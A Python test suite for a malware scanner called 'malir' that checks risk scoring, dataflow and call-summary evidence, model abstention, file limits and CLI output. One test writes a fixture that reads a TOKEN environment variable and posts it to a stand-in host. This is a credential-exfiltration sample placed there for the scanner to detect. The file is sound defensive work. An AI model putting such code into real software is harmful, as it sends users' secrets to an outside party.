import json
from pathlib import Path

from malir.cli import main
from malir.scanner import ScanLimits, Scanner

FIXTURES = Path(__file__).parent / "fixtures"


def test_benign_fixture_has_low_signal():
    report = Scanner().scan(FIXTURES / "benign")
    assert report.files_scanned == 1
    assert report.verdict == "low-signal"


def test_suspicious_fixture_has_evidence():
    report = Scanner().scan(FIXTURES / "suspicious")
    assert report.risk_score >= 50
    assert any(item.motif for item in report.evidence)


def test_inert_hard_negatives_are_not_upgraded_by_local_flow():
    for path in sorted((FIXTURES / "hard_negative").glob("*.py")):
        local_flow = Scanner(enable_dataflow=True).scan(path)
        proximity_only = Scanner(enable_dataflow=False).scan(path)
        assert local_flow.risk_score < 25
        assert local_flow.risk_score == proximity_only.risk_score
        assert not any(
            item.evidence_kind in {"dataflow", "summary"}
            for item in local_flow.evidence
        )


def test_scanner_serializes_model_support_abstention():
    class UnsupportedModel:
        def predict_details(self, _tokens: list[str]) -> dict:
            return {
                "probability": 0.8,
                "supported": False,
                "token_coverage": 0.5,
                "nearest_similarity": 0.1,
                "unknown_tokens": ["O:FUTURE"],
            }

    report = Scanner(model=UnsupportedModel()).scan(FIXTURES / "benign")
    output = report.to_dict()

    assert output["model_supported"] is False
    assert output["model_abstained"] is True
    assert output["model_used"] is False
    assert output["model_unknown_tokens"] == ["O:FUTURE"]
    assert any("abstained" in warning for warning in output["warnings"])


def test_scanner_skips_symlink(tmp_path):
    target = tmp_path / "target.py"
    target.write_text("print('not executed')", encoding="utf-8")
    link = tmp_path / "link.py"
    link.symlink_to(target)
    report = Scanner().scan(tmp_path)
    assert report.files_scanned == 1
    assert report.files_skipped == 1


def test_scanner_enforces_file_size_limit(tmp_path):
    target = tmp_path / "large.py"
    target.write_text("#" * 100, encoding="utf-8")
    scanner = Scanner(limits=ScanLimits(max_file_bytes=10))
    report = scanner.scan(tmp_path)
    assert report.files_scanned == 0
    assert report.files_skipped == 1


def test_cli_json_output(capsys):
    code = main(["scan", str(FIXTURES / "benign"), "--json"])
    output = json.loads(capsys.readouterr().out)
    assert code == 0
    assert output["schema"] == "malir.scan.v1"
    assert output["assessment"] == "no-malware-evidence"


def test_cli_accepts_file_without_scan_subcommand(capsys):
    target = FIXTURES / "suspicious" / "static_exfil.py"
    code = main([str(target), "--json"])
    output = json.loads(capsys.readouterr().out)
    assert code == 0
    assert output["assessment"] == "malware-like"
    assert output["risk_score"] >= 50
    assert output["evidence"]


def test_parse_error_becomes_warning(tmp_path):
    target = tmp_path / "broken.py"
    target.write_text("def broken(:\n", encoding="utf-8")
    report = Scanner().scan(tmp_path)
    assert report.files[0].parse_error
    assert any("parse error" in warning for warning in report.warnings)


def test_scanner_reports_direct_call_summary_with_medium_confidence(
    tmp_path,
    capsys,
):
    target = tmp_path / "summary.py"
    target.write_text(
        """
import os
import requests

def transmit(payload):
    requests.post("https://example.invalid", data=payload)

transmit(os.getenv("TOKEN"))
""",
        encoding="utf-8",
    )

    report = Scanner().scan(target)
    summaries = [
        item
        for item in report.evidence
        if item.evidence_kind == "summary" and item.motif == "credential_or_file_exfil"
    ]

    assert len(summaries) == 1
    assert summaries[0].confidence == "medium"
    assert report.rule_score == 36.0

    local_only = Scanner(enable_call_summaries=False).scan(target)
    assert not any(item.evidence_kind == "summary" for item in local_only.evidence)
    assert local_only.rule_score == 22.0

    code = main(
        ["scan", str(target), "--json", "--no-call-summaries"],
    )
    output = json.loads(capsys.readouterr().out)
    assert code == 0
    assert not any(
        item.get("evidence_kind") == "summary" for item in output["evidence"]
    )
